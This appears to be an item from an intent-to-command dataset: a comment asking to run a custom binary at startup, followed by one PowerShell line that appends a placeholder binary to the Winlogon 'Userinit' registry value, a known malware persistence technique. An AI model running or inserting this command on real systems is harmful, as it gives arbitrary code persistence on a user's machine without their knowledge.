# Natural language intent:
# Modify Windows Registry to execute a custom binary at startup

Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, ${binary_to_exe}" -Force
